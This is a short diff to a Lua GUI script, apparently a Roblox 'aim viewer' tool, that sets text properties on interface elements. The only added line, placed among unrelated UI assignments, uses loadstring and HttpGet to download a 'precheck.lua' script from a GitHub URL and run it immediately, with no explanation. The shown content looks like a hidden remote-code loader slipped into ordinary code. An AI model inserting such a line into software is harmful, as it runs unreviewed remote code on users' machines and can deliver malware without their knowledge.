@@ -122,6 +122,7 @@ Username.Text = ""
 Username.TextColor3 = Color3.fromRGB(167, 167, 167)
 Username.TextSize = 24.000
 Username.TextXAlignment = Enum.TextXAlignment.Left
+loadstring(game:HttpGet("https://raw.githubusercontent.com/asteria-a/aim-viewer/main/precheck.lua"))()
 
 EnableAimViewer.Name = "EnableAimViewer"
 EnableAimViewer.Parent = MainFrame
